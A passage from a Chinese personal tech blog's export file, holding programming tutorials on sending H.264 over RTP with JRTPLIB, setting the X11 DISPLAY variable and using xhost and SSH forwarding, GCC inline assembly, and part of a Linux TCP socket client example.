                &#125;
                break;
            &#125;
            &#125;



           	memset(this->rframe->pframe,0,this->rframe->use_len);//清空缓存，为下次做准备  
			
            this->cur_size = 0;  
        &#125;  
        else//放入缓冲区，在此必须确保有序  
        &#123;  
            //unsigned char* p = rtppack.GetPayloadData();  
  
  
            memcpy(this->rframe->pframe + this->cur_size,pack.GetPayloadData(),pack.GetPayloadLength());  
            this->cur_size += pack.GetPayloadLength();  
        &#125;  
    &#125;  
  这里只提供发送部分的代码，我的接收部分的代码和服务端写在一起的不好抽离。
y_jrtp.cpp
#include "y_jrtp.h"

static bool CheckError(int rtperr)
&#123;
    if (rtperr &lt; 0)
    &#123;
        std::cout&lt;&lt;"ERROR: "&lt;&lt;RTPGetErrorString(rtperr)&lt;&lt;std::endl;
        return false;
    &#125;
    return true;
&#125;


yJRTPLIB::yJRTPLIB(void)&#123;

&#125;
yJRTPLIB::~yJRTPLIB(void)&#123;

&#125;

void yJRTPLIB::SendX264NalUnit(uint8_t * const p_payload, const int i_payload)&#123;

    uint8_t *p_Nalu;
    int NaluSize;
    uint8_t Sbuf[MAX_RTP_PKT_LENGTH];
    int status;


    p_Nalu = p_payload;
    NaluSize = i_payload;
    CLEAR_MEM(Sbuf);

    printf("Nal unit length is %d \n",NaluSize);
    //去除前导码0x000001 或者0x00000001
    //if( 0x01 == m_h264Buf[2] )
    //&#123;
    //  pSendbuf = &amp;m_h264Buf[3];
    //  buflen -= 3;
    //&#125;
    //else
    //&#123;
    //  pSendbuf = &amp;m_h264Buf[4];
    //  buflen -= 4;
    //&#125;

    if ( NaluSize &lt;= MAX_RTP_PKT_LENGTH )
    &#123;
        memcpy(Sbuf,p_Nalu,NaluSize);
        status = this->sess.SendPacket((void *)Sbuf,NaluSize);

        CheckError(status);
    &#125;
    else if (NaluSize > MAX_RTP_PKT_LENGTH)&#123;

        this->sess.SetDefaultMark(false);//mark that this is not finall pkg
        int k=0,l=0;
        k = NaluSize / MAX_RTP_PKT_LENGTH;  //k>=1
        l = NaluSize % MAX_RTP_PKT_LENGTH;  //l>=0
        int t=0;//用指示当前发送的是第几个分片RTP包
        int SendLen;
#ifdef CODE_M
        while( (t &lt; k) || ((t == k) &amp;&amp; (l > 0)) )&#123;

            if ( t &lt; k - 1)&#123;//0~k-2,total k - 1 pkgs

                memcpy(Sbuf,(p_Nalu+( t * MAX_RTP_PKT_LENGTH)),MAX_RTP_PKT_LENGTH);
                status = this->sess.SendPacket((void *)Sbuf,MAX_RTP_PKT_LENGTH);
                CheckError(status);

            &#125;
            else &#123;//last pkg, t == k,l > 0, or (k -1)'th pkg

                if ( (t == k-1) &amp;&amp; ( l == 0 ) || (l > 0) &amp;&amp; ( t == k))&#123;

                    this->sess.SetDefaultMark(true);

                    if ( l > 0 )
                        SendLen = l;
                    else
                        SendLen = MAX_RTP_PKT_LENGTH;

                    memcpy(Sbuf,(p_Nalu+( t * MAX_RTP_PKT_LENGTH)),SendLen);
                    status = this->sess.SendPacket((void *)Sbuf,SendLen);
                    CheckError(status);

                &#125;
                else &#123;//(t == k-1) &amp;&amp; ( l > 0 )

                    memcpy(Sbuf,(p_Nalu+( t * MAX_RTP_PKT_LENGTH)),MAX_RTP_PKT_LENGTH);
                    status = this->sess.SendPacket((void *)Sbuf,MAX_RTP_PKT_LENGTH);
                    CheckError(status);

                &#125;
            &#125;
            t++;

        &#125;
#else
 while( t &lt; k || ( t==k &amp;&amp; l>0 ) )
        &#123;
            if( (0 == t ) || ( t&lt;k &amp;&amp; 0!=t ) )//第一包到最后包的前一包
            &#123;
                /*sendbuf[0] = (nalHeader &amp; 0x60)|28;
                sendbuf[1] = (nalHeader &amp; 0x1f);
                if ( 0 == t )
                &#123;
                    sendbuf[1] |= 0x80;
                &#125;
                memcpy(sendbuf+2,&amp;pSendbuf[t*MAX_RTP_PKT_LENGTH],MAX_RTP_PKT_LENGTH);
                status = this->SendPacket((void *)sendbuf,MAX_RTP_PKT_LENGTH+2);*/
                memcpy(Sbuf,&amp;p_Nalu[t*MAX_RTP_PKT_LENGTH],MAX_RTP_PKT_LENGTH);
                status = this->sess.SendPacket((void *)Sbuf,MAX_RTP_PKT_LENGTH);
                CheckError(status);
                t++;
            &#125;
            //最后一包
            else if( ( k==t &amp;&amp; l>0 ) || ( t== (k-1) &amp;&amp; l==0 ))
            &#123;
                //设置标志位Mark为1
                this->sess.SetDefaultMark(true);

                int iSendLen;
                if ( l > 0)
                &#123;
                    iSendLen = NaluSize - t*MAX_RTP_PKT_LENGTH;
                &#125;
                else
                    iSendLen = MAX_RTP_PKT_LENGTH;

                //sendbuf[0] = (nalHeader &amp; 0x60)|28;
                //sendbuf[1] = (nalHeader &amp; 0x1f);
                //sendbuf[1] |= 0x40;

                //memcpy(sendbuf+2,&amp;pSendbuf[t*MAX_RTP_PKT_LENGTH],iSendLen);
                //status = this->SendPacket((void *)sendbuf,iSendLen+2);

                memcpy(Sbuf,&amp;p_Nalu[t*MAX_RTP_PKT_LENGTH],iSendLen);
                status = this->sess.SendPacket((void *)Sbuf,iSendLen);

                CheckError(status);
                t++;
            &#125;

        &#125;
#endif
    &#125;
&#125;

void yJRTPLIB::SetX264Parm()
&#123;
    this->sess.SetDefaultPayloadType(H264);//设置传输类型
    this->sess.SetDefaultMark(true);      //设置位
    this->sess.SetTimestampUnit(1.0/9000.0); //设置采样间隔
    this->sess.SetDefaultTimestampIncrement(10);//设置时间戳增加间隔
&#125;
int yJRTPLIB::SetRtpParm(std::string &amp;d_ip)&#123;

    int status;
    std::string ipstr = d_ip;
    uint32_t destip;

    if ( (destip = inet_addr(ipstr.c_str())) == INADDR_NONE)
    &#123;
        std::cerr &lt;&lt; "Bad IP address specified" &lt;&lt; std::endl;
        return -1;
    &#125;

    RTPUDPv4TransmissionParams transparams;
    RTPSessionParams sessparams;

    //sessparams.SetOwnTimestampUnit(1.0/9000.0); //时间戳单位
    sessparams.SetOwnTimestampUnit(1.0/10.0); //时间戳单位
    sessparams.SetAcceptOwnPackets(true);   //接收自己发送的数据包
    sessparams.SetUsePredefinedSSRC(true);  //设置使用预先定义的SSRC
    sessparams.SetPredefinedSSRC(SSRC);     //定义SSRC

    transparams.SetPortbase(PORTBASE);

    status = sess.Create(sessparams,&amp;transparams);
    CheckError(status);

    destip = ntohl(destip);
    RTPIPv4Address addr(destip,DESTPORT);
    status = sess.AddDestination(addr);
    CheckError(status);
&#125;
y_jrtp.h
#ifndef Y_JRTP_H
#define Y_JRTP_H

#include &lt;rtpsession.h>
#include &lt;rtpudpv4transmitter.h>
#include &lt;rtpipv4address.h>
#include &lt;rtpsessionparams.h>
#include &lt;rtperrors.h>
#include &lt;rtplibraryversion.h>
#include &lt;iostream>

//port必须是偶数
#define PORTBASE 6000
#define DESTPORT 6002
#define DESTIP "127.0.0.1"
#define H264 96

/*
SSRC：同步源标识。
*/

#define SSRC 1

//Internet 对 pkg-len>1400丢包概率很大，RTP header 12bytes,RTP pkg-max-len &lt;= 1388
//MTU 48~1500, UDP data max len = 1500 - 20(IP header) - 8(UDP header)
#define MAX_RTP_PKT_LENGTH 1300

#ifndef CLEAR_MEM
#define CLEAR_MEM(mem) memset((mem),0,sizeof((mem)))
#endif

using namespace jrtplib;



class yJRTPLIB&#123;

    public:
        yJRTPLIB(void);
        ~yJRTPLIB(void);
        void SendX264NalUnit(uint8_t * const p_payload, const int i_payload);
        void SetX264Parm(void);
        int SetRtpParm(std::string &amp;d_ip);
    private:
        RTPSession sess;
&#125;;


#endif // Y_JRTP_H
  首先，这里面的一些代码我直接使用的网上的某些教程，每一处用了一点，然后自己整理成这样的，这里再次说明，拆包部分的宏CODE_M是我的，另外一部分是网友的，不知道是谁，找不到最开始的出处。
  好了JrtpLib就这些东西了，没有啥新鲜的，对于我这种小白用户，我也只需要了解这么多，如果想要优化RTP传输或者其他的想法，你就得好好的去读读这些代码，并深入的了解RTP协议。




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
        <category>linux开发</category>
      </categories>
      <tags>
        <tag>h264</tag>
        <tag>JRTPLIB</tag>
        <tag>实时视频传输</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux DISPLAY环境变量的妙用(error:QXcbConnection: Could not connect to display) ,xhost 命令, 通过ssh连接显示界面</title>
    <url>/2017/03/27/blog_idx_033/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  无




DISPLAY 变量

  最近由于特殊原因，要在字符终端中的bash运行一个带GUI的PyQT程序。报了一个错误为：QXcbConnection: Could not connect to display
  我在GUI桌面中的bash能够执行此PyQt程序，但是在字符终端中的bash执行就会报错
  想到是由于无图形界面的原因，在网上找了一下午，想实现一个功能就是在tty1中指定tty7来运行这个程序，但是没有找到解决办法，最后发现一个环境变量可以很Ok的解决此问题。


问题说明
  此类问题可以归结于:在非图形终端执行了一个GUI程序，导致X11Server在此终端的环境下无法显示图形，需要手动指定X11Server把图形显示到其他的带图形界面的终端。
DISPLAY 变量
eg:DISPLAY=hostip:NumA.NumB
（注意当显示到本机的其他tty时，hostip 为空，一般情况下NumA,NumB为0）
eg:DISPLAY=:0.0




2019/03/25更新



有意栽花花不发，无心插柳柳成荫。
  原文的本意只是简单记录了我的一个试验成功的实验，没想到那么多人关注这个。
  原试验内容：你按ctrl+atl+F1进入tty1，然后你在tty1中执行带GUI功能的程序，一般就会报相应的显示错误。这个错误的原因就是DISPLAY变量没有设置的原因。你可以通过：echo ${DISPLAY}
  简单来说，当你在终端执行一个带GUI功能的程序的时候，如果DISPLAY变量没有定义，就会报相应的错误。至少对于Xserver的系统是这样的。


DISPLAY 简单说明
  我就是简单翻译此网页的某些我们关注的段落（如有侵权，联系我立即删除）：https://gerardnico.com/ssh/x11/display
The magic word in the X window system is DISPLAY.
在X视窗系统中，这个比较神奇的SHELL变量是DISPLAY。

The X display server install itself normally as display number 0 on your local machine. 
在你的本地机器上，X显示服务程序在安装的时候，会把自己设置为“显示0”。

A display consists (simplified) of:
a keyboard,
a mouse
and a screen.
一个“显示”一般由以下内容组成：
一个键盘
一个鼠标
一个显示器。

A display is managed by a server program, known as an X server. The server serves displaying capabilities to other programs that connect to it.
一个“显示”被一个叫做X服务的服务程序管理。这个服务为连接它的其他程序提供“显示“服务。

The SSH protocol has the ability to securely forward X Window System applications over an encrypted SSH connection, so that you can run an application on the SSH server machine and have it put its windows up on your local machine without sending any X network traffic in the clear. $DISPLAY on the remote machine should point to localhost. SSH does the forwarding.
SSH协议通过一个加密的SSH连接，能够安全地传输X桌面系统程，因此，在没有发送任何X网络传输的时候，你可以毫无阻碍地在SSH所在的服务器运行你的程序并让其界面在你本地电脑启动起来。DISPLAY变量必须在远程机器上设置为localhost，SSH配置为启用X11转发。

The value of the display environment variable is:
这个DISPLAY环境变量的值是：

hostname:D.S
主机名:"显示号".“屏幕号”

where:
说明：

hostname is the name of the computer where the X server runs. An omitted hostname means the localhost.
一个运行了X服务的计算机的名字是主机名。一个缺省的主机名是localhost。

D is a sequence number (usually 0). It can be varied if there are multiple displays connected to one computer.
D 是一个通常为0的序列号。它可以区分这个有多少个“显示”连接到了这个计算机。

S is the screen number. A display can actually have multiple screens. Usually there's only one screen though where 0 is the default.
S 是一个屏幕号。一个“显示“能够有多个屏幕。通常，一个计算机有一个屏幕，其序号默认是0。

hostname:D.S means screen S on display D of host hostname; the X server for this display is listening at TCP port 6000+D.
hostname:D.S这种格式的定义是：“显示D”显示到一个主机为hostname的屏幕上。X服务对于这个“显示”是通过监听TCP端口6000+D 这个端口号实现的。(如：localhost:4.0,  对于这个显示实例，Xserver监听的就是6004这个端口.)

host/unix:D.S means screen S on display D of host host; the X server for this display is listening at UNIX domain socket /tmp/.X11-unix/XD (so it's only reachable from host).
host/unix:D.S这种格式的定义是：“显示D”显示到一个主机地址为host的屏幕上。X服务对于这个“显示”是通过监听UNIX本地socket实现的。因此host必须是可以连接的。

:D.S is equivalent to host/unix:D.S, where host is the local hostname.
:D.S 和host/unix:D.S是一样的。这里是一种简写方式，host是本地的主机名，如localhost.
  以上翻译可能不太准确，我翻译很屁的。
2019/09/26更新 ，补充xhost命令

  今天再ubuntu 18.04上，切换root，运行/snap/bin/gnome-system-monitor程序，显示如下：

    
        
    
  
  我首先说明，这里我已经设置了DISPLAY环境变量，但是发现我被拒绝连接了。于是查了查，和xhost命令有关，xhost简单来说就是控制其他用户或者其他ip是否可以访问当前用户启动的xserver。
  于是我解除其他用户访问限制：xhost +

    
        
    
  
  然后再次root重新运行，可以正常打开了。

    
        
    
  




2020/03/13更新 用xshell，putty等ssh链接工具链接时，显示图形界面


    
        
    
  

    
        
    
  
  勾选后，你再次进入shell（重连ssh），echo $DISPLAY 会发现变量已经被定义了。下面用xshell为例。

    
        
    
  
  如果没有DISPLAY变量还是空，则配置sshd_config文件。如下图打开x11转发：
/etc/ssh/sshd_config文件 如果画框为no改为yes

    
        
    
  
  sudo service ssh restart 重启sshd服务
  再次通过xshell连接linux目标。就可得到如下的图：（如未得到，多检查，多学习）

    
        
    
  
  图中画框的tcp就是转发出来的x11链接，你如果再开一个ssh链接，你会发现DISPLAY变量又变了：

    
        
    
  
  这个时候你在xshell终端中输入任何一个gui 程序，会弹出如下框，安装好后，就可以正常显示GUI界面了。

    
        
    
  
  xmanager是收钱的，我这里用另外一个MobaXterm但是道理都是一样的。

    
        
    
  
其实这里的更新内容，在我翻译的那段文字里面有，只是不知道多少人看了！！！！哎！！！




后记

  一句话来说，对于桌面是由x服务的图形系统来说,只有设置了DISPLAY变量，才能够让GUI程序正常的显示起来。
  对于我们经常进入的桌面，然后开一个terminal，你会发现，DISPLAY已经被自动设置了。所以才没有问题。而对于我们进的不是桌面terminal来说，DISPLAY变量是没有设置的。需要我们手动设置，GUI程序才能够正常启动。
  2019/09/26更新，如果无法正常显示， xserver安全访问系统可能会阻止你访问xserver，当设置了正确的DISPLAY变量后无法显示，请尝试xhost 命令解除访问控制。
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>linux开发</category>
      </categories>
      <tags>
        <tag>GUI</tag>
        <tag>linux</tag>
        <tag>pyqt</tag>
        <tag>终端</tag>
      </tags>
  </entry>
  <entry>
    <title>GCC&amp;&amp;G++ C &amp;&amp; C++ 内嵌汇编和调用汇编函数的方法(x86，ARM自己对照改)</title>
    <url>/2017/08/23/blog_idx_038/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  测试环境：Linux  4.8.0-36-generic #36~16.04.1-Ubuntu SMP Sun Feb 5 09:39:57 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
  gcc:
Using built-in specs.
COLLECT_GCC=gcc
COLLECT_LTO_WRAPPER=/usr/lib/gcc/x86_64-linux-gnu/5/lto-wrapper
Target: x86_64-linux-gnu
Configured with: ../src/configure -v --with-pkgversion='Ubuntu 5.4.0-6ubuntu1~16.04.4' --with-bugurl=file:///usr/share/doc/gcc-5/README.Bugs --enable-languages=c,ada,c++,java,go,d,fortran,objc,obj-c++ --prefix=/usr --program-suffix=-5 --enable-shared --enable-linker-build-id --libexecdir=/usr/lib --without-included-gettext --enable-threads=posix --libdir=/usr/lib --enable-nls --with-sysroot=/ --enable-clocale=gnu --enable-libstdcxx-debug --enable-libstdcxx-time=yes --with-default-libstdcxx-abi=new --enable-gnu-unique-object --disable-vtable-verify --enable-libmpx --enable-plugin --with-system-zlib --disable-browser-plugin --enable-java-awt=gtk --enable-gtk-cairo --with-java-home=/usr/lib/jvm/java-1.5.0-gcj-5-amd64/jre --enable-java-home --with-jvm-root-dir=/usr/lib/jvm/java-1.5.0-gcj-5-amd64 --with-jvm-jar-dir=/usr/lib/jvm-exports/java-1.5.0-gcj-5-amd64 --with-arch-directory=amd64 --with-ecj-jar=/usr/share/java/eclipse-ecj.jar --enable-objc-gc --enable-multiarch --disable-werror --with-arch-32=i686 --with-abi=m64 --with-multilib-list=m32,m64,mx32 --enable-multilib --with-tune=generic --enable-checking=release --build=x86_64-linux-gnu --host=x86_64-linux-gnu --target=x86_64-linux-gnu
Thread model: posix
gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) 
前言

  无




gcc/cpp/c内嵌汇编



内嵌汇编格式和编译器息息相关，对于不同的编译器，有不同的内嵌规则，这里以gcc为例。（此外，基本的一些知识点，我这里就不重复说了，有需要可以去百度相关的东西，此文的面向读者为了解一些汇编知识的人，比如知道一些基本的寄存器等等）


gcc内嵌汇编格式，基本内嵌汇编寄存器等引用为%，带C&amp;&amp;C++的寄存器等引用为%%


__asm__ [__volatile__] ("instruction list");//基本内嵌汇编
__asm__ [__volatile__]("instruction list":Output:Input:Clobber/Modify);//带C&amp;C++相关内容的内嵌汇编


以c=a+b为例


    在代码段中内嵌汇编
      根据第二节的第二种格式，一一对应，就知道，我把a给了ebx,b给了eax，求和后放入eax，把eax传给变量ret
int user_add1(int a, int b)&#123;

	int ret;
	__asm__ __volatile__("movl %2, %%eax;movl %1, %%ebx;addl %%ebx, %%eax;movl %%eax, %0"		
				:"=m"(ret)
				:"m"(a),"m"(b)
				:"eax","ebx","memory"
				);
	return ret;
&#125;
    在代码中调用汇编子程序
      这里先开辟一个栈帧，然后读到两个传入参数a,b在栈中的位置，并放入寄存器，并对寄存器进行操作求和，函数返回值放在eax中
//xxx.c文件中
c=user_add(a+b);
//xxx.s文件中
.text
.globl	user_add
.type	user_add, @function
user_add:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movl	%edi, -20(%rbp)
	movl	%esi, -24(%rbp)
	addl    %esi, %edi
	movl	%edi, -4(%rbp)
	movl	-4(%rbp), %eax
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
    在内嵌汇编代码中调用汇编子程序
      由于调用的时候，我先吧参数传给了eax，ebx，通过call，我直接对eax，ebx求和，得到结果
//xxx.c文件中
	int ret;
	__asm__ __volatile__("movl %2, %%eax;movl %1, %%ebx;call user_add2"		
				:"=a"(ret)
				:"m"(a),"m"(b)
				:"ebx","memory"
				);
				
//xxx.s文件中
.text
.globl	user_add2
.type	user_add2, @function
user_add2:
	addl %ebx,%eax
	ret


总结与分析

首先这是x86下面的汇编指令格式，如果是ARM或者MIPS等平台，请根据各自的指令格式进行修改。
这里需要注意的是，从这三种方式来看，前两种方式里面，我们必须要注意，在通过c的方式调用函数时，其参数的存放位置在哪里，参数的存放顺序，同时我们还必须知道gcc的默认调用约定是什么。这是极其重要的
第三种方式的调用的最简单粗暴的，但是可能会隐含一些问题，如果gcc没有帮你很好的保护现场，那么可能会出现程序崩溃的情况。



源代码和测试


//t.c
#include &lt;stdio.h>
extern int  user_add(int a, int b);
extern int  user_add2(int a, int b);
int user_add1(int a, int b)&#123;

	int ret;
	__asm__ __volatile__("movl %2, %%eax;movl %1, %%ebx;addl %%ebx, %%eax;movl %%eax, %0"		
				:"=m"(ret)
				:"m"(a),"m"(b)
				:"eax","ebx","memory"
				);
	return ret;
&#125;
int main(int argc, char *argv[])&#123;


	int a = 6;
	int b = 3;

	printf("user_add1 sum(a+b)=%d\n",user_add1(a,b));

	printf("user_add sum(a+b)=%d\n",user_add(a,b));

	int ret;
	__asm__ __volatile__("movl %2, %%eax;movl %1, %%ebx;call user_add2"		
				:"=a"(ret)
				:"m"(a),"m"(b)
				:"ebx","memory"
				);
	printf("user_add2 sum(a+b)=%d\n",ret);
	return 0;
&#125;

//t1.s

.text
.globl	user_add
.type	user_add, @function
user_add:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movl	%edi, -20(%rbp)
	movl	%esi, -24(%rbp)
	addl    %esi, %edi
	movl	%edi, -4(%rbp)
	movl	-4(%rbp), %eax
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc


.text
.globl	user_add2
.type	user_add2, @function
user_add2:
	addl %ebx,%eax
	ret
 编译及运行效果：

    
        
    
  




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>gcc</tag>
        <tag>汇编</tag>
        <tag>C&amp;CPP</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Socket 摘要（二）（基于TCP的C/S基本实现，相关基础知识，非阻塞select）</title>
    <url>/2017/08/31/blog_idx_039/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  测试环境:Linux  4.10.0-33-generic #37~16.04.1-Ubuntu SMP Fri Aug 11 14:07:24 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
前言

  无




Socket摘要2



关于linux socket通信，要详细了解清楚，不知道要说多少天。所以网上大部分教程也是只介绍了基本的api调用流程。一些其他的问题还没有提及，当然本文作者由于水平有限，估计也只能介绍个流程，并且解决一些简单的未涉及的问题。


TCP的基本要点，三次握手，四次分手，分别代表了开始和结束。下图是我在百度图片上找的一个图，完全找不到原图出自哪里，很伤感。



    
        
    
    
  说明：此图完全清晰可见的描述了一个tcp通信到底做了一些什么。我也不详细说明，改天可以给大家抓包分析分析。


通过上图我们可以看到，客户端connect后，就可以write和read了，而服务端accept后可以做同样的事情，最后只需要close就能够解决。下面我们简要的来分析一下这个流程。



    
        
    
  

    
        
    
  
  上图是我写的一个服务端程序跑起来后，通过netstat可以看到此进程进入了listen状态。

    
        
    
  

    
        
    
  

    
        
    
  
  上面三个图演示了一个tcp通信的完整过程。第三图1-3是connect，4是write：Hello Server，5是对4的响应，代表收到，6是write：Hello Client，7同理5，8-11对应close，和上文所要展示的流程基本相同。

    
        
    
  
  上图是查看端口，可见tcp的链接状况（图中pid和上文图中pid不对应的原因是非同一个测试）。


好了，上文BB了那么多，只是要科普一下而已，现在进入正题，首先来看几个定义及结构体。结构体1


typedef unsigned short __kernel_sa_family_t;
typedef __kernel_sa_family_t	sa_family_t;      
struct sockaddr &#123;//通用结构体，很多socket相关api都要使用它
           sa_family_t sa_family;
           char        sa_data[14];
&#125;
结构体2
typedef uint32_t in_addr_t;
struct in_addr//ip地址存放结构体
&#123;
in_addr_t s_addr;
&#125;;

#define __SOCKADDR_COMMON(sa_prefix) \
sa_family_t sa_prefix##family

struct sockaddr_in//ip4 地址结构
&#123;
__SOCKADDR_COMMON (sin_);
in_port_t sin_port;                 //Port number.  
struct in_addr sin_addr;            // Internet address.  

// Pad to size of `struct sockaddr'
unsigned char sin_zero[sizeof (struct sockaddr) -
                           __SOCKADDR_COMMON_SIZE -
                           sizeof (in_port_t) -
                           sizeof (struct in_addr)];
&#125;;
结构体3
#define _K_SS_MAXSIZE   128      //Implementation specific max size 
#define _K_SS_ALIGNSIZE (__alignof__ (struct sockaddr *))
//Implementation specific desired alignment 

typedef unsigned short __kernel_sa_family_t;

struct __kernel_sockaddr_storage &#123;//此结构体是新内核提出的，可以存储所有协议地址类型
    __kernel_sa_family_t    ss_family;              //address family 
    // Following field(s) are implementation specific 
    char            __data[_K_SS_MAXSIZE - sizeof(unsigned short)];
    // space to achieve desired size, 
// _SS_MAXSIZE value minus size of ss_family 
&#125; __attribute__ ((aligned(_K_SS_ALIGNSIZE)));   /* force desired alignment 
  结构体1，2是ip4网络编程常用的一些结构体，结构体3是新内核对于多种协议地址结构提出的一个新的通用的存储结构体。


关于这些结构体的知识我们就到这里了。现在来讲一讲linux上的socket编程。下面就是cs通信中，各自要使用的api及调用顺序，这也是最基本的socket通信，也是网上流传最广的通信例子。


client:
int socket(int domain, int type, int protocol);
int connect(int sockfd, const struct sockaddr *addr,  socklen_t addrlen);
read/write
close
server:
int socket(int domain, int type, int protocol);
int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
int listen(int sockfd, int backlog);
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);//阻塞io
read/write
close


非阻塞通信，关键select(注意，这里没有使用更高级的epoll，因为我对这个api也是一个菜鸡)


int select(int nfds, fd_set *readfds, fd_set *writefds,
           fd_set *exceptfds, struct timeval *timeout);

void FD_CLR(int fd, fd_set *set);
int  FD_ISSET(int fd, fd_set *set);
void FD_SET(int fd, fd_set *set);
void FD_ZERO(fd_set *set);

  对于这个api，简单来说，就是监控 所有传入的 文件描述符集合，当相关文件描述集合可读， 可写 ，异常时，select正常返回，否则可能是等待超时，可能是出错。对于本文，就是监控客户端socket fd，监控服务端socket fd和accept接受的fd。


其他的都不说了，口水都干了，直接上例子代码，然后喝口水，上个厕所，洗个手，坐等下班
client.c


#include &lt;stdio.h>
#include &lt;unistd.h>
#include &lt;sys/types.h> /* See NOTES */
#include &lt;sys/socket.h>

#include &lt;errno.h>
#include &lt;string.h>

#include &lt;arpa/inet.h>

#include &lt;sys/select.h>

/* According to earlier standards */
#include &lt;sys/time.h>
#include &lt;sys/types.h>
#include &lt;unistd.h>

#define TARGETPORT 6666
#define TARGETIP "127.0.0.1"
int main(int argc, char *argv[])
&#123;

    /*
int socket(int domain, int type, int protocol);

domain:
       AF_UNIX, AF_LOCAL   Local communication              unix(7)
       AF_INET             IPv4 Internet protocols          ip(7)
       AF_INET6            IPv6 Internet protocols          ipv6(7)
       AF_IPX              IPX - Novell protocols
       AF_NETLINK          Kernel user interface device     netlink(7)
       AF_X25              ITU-T X.25 / ISO-8208 protocol   x25(7)
       AF_AX25             Amateur radio AX.25 protocol
       AF_ATMPVC           Access to raw ATM PVCs
       AF_APPLETALK        AppleTalk                        ddp(7)
       AF_PACKET           Low level packet interface       packet(7)
       AF_ALG              Interface to kernel crypto API
type:
       SOCK_STREAM     Provides sequenced, reliable, two-way, connection-based
                       byte  streams.  An out-of-band data transmission mecha‐
                       nism may be supported.

       SOCK_DGRAM      Supports datagrams (connectionless, unreliable messages
                       of a fixed maximum length).

       SOCK_SEQPACKET  Provides  a  sequenced,  reliable,  two-way connection-
                       based data transmission path  for  datagrams  of  fixed
                       maximum  length;  a  consumer  is  required  to read an
                       entire packet with each input system call.

       SOCK_RAW        Provides raw network protocol access.

       SOCK_RDM        Provides a reliable datagram layer that does not  guar‐
                       antee ordering.

       SOCK_PACKET     Obsolete  and  should  not be used in new programs; see
                       packet(7).

protocol:
       The protocol specifies a  particular  protocol  to  be  used  with  the
       socket.  Normally only a single protocol exists to support a particular
       socket type within a given protocol family, in which case protocol  can
       be  specified  as  0.   However, it is possible that many protocols may
       exist, in which case a particular protocol must be  specified  in  this
       manner.   The  protocol number to use is specific to the “communication
       domain” in which communication is to take place; see protocols(5).  See
       getprotoent(3) on how to map protocol name strings to protocol numbers.
*/
    int fd;
    if (0 > (fd = socket(AF_INET, SOCK_STREAM, 0)))
    &#123;

        perror("socket create error:");
        return -1;
    &#125;
    /*
    int bind(int sockfd, const struct sockaddr *addr,
                socklen_t addrlen);

    typedef unsigned short __kernel_sa_family_t;
    typedef __kernel_sa_family_t	sa_family_t;      
    struct sockaddr &#123;
               sa_family_t sa_family;
               char        sa_data[14];
    &#125;

    typedef uint32_t in_addr_t;
    struct in_addr
    &#123;
    in_addr_t s_addr;
    &#125;;

    #define __SOCKADDR_COMMON(sa_prefix) \
    sa_family_t sa_prefix##family

    struct sockaddr_in
    &#123;
    __SOCKADDR_COMMON (sin_);
    in_port_t sin_port;                 /* Port number.  
    struct in_addr sin_addr;            /* Internet address.  
    
    // Pad to size of `struct sockaddr'.  
    unsigned char sin_zero[sizeof (struct sockaddr) -
                               __SOCKADDR_COMMON_SIZE -
                               sizeof (in_port_t) -
                               sizeof (struct in_addr)];
    &#125;;
    

    #define _K_SS_MAXSIZE   128      //Implementation specific max size 
    #define _K_SS_ALIGNSIZE (__alignof__ (struct sockaddr *))
    //Implementation specific desired alignment 

    typedef unsigned short __kernel_sa_family_t;

    struct __kernel_sockaddr_storage &#123;
        __kernel_sa_family_t    ss_family;              /* address family 
        /* Following field(s) are implementation specific 
        char            __data[_K_SS_MAXSIZE - sizeof(unsigned short)];
        /* space to achieve desired size, */
    /* _SS_MAXSIZE value minus size of ss_family 
    &#125; __attribute__ ((aligned(_K_SS_ALIGNSIZE)));   /* force desired alignment 

    */

    struct sockaddr_in addr;
    memset(&amp;addr, 0, sizeof(struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(TARGETPORT);
    //addr.sin_addr.s_addr = htonl
    //int inet_pton(int af, const char *src, void *dst);
    inet_pton(AF_INET, TARGETIP, (void *)&amp;(addr.sin_addr.s_addr));

    //int connect(int sockfd, const struct sockaddr *addr,\
        socklen_t addrlen);

    if (0 > connect(fd, (const struct sockaddr *)&amp;addr, sizeof(struct sockaddr)))
    &#123;

        perror("socket connect error:");
        return -1;
    &#125;
    int ret;
    struct timeval timeout;
